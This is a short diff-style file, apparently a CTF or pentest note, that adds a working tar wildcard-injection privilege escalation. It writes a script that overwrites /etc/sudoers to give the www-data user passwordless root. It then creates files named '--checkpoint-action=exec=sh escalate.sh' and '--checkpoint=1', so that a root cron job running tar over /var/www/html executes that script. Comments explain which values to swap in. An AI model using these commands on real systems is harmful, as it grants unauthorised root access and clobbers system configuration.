@@ -1,0 +1,9 @@
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > escalate.sh
+echo "/var/www/html" > "--checkpoint-action=exec=sh escalate.sh"
+echo "/var/www/html" > --checkpoint=1
+
+
+#Tips
+
+#line 1 www-data = current user
+#Line 2 and 3 /var/www/html = directory that was tar from crontab output
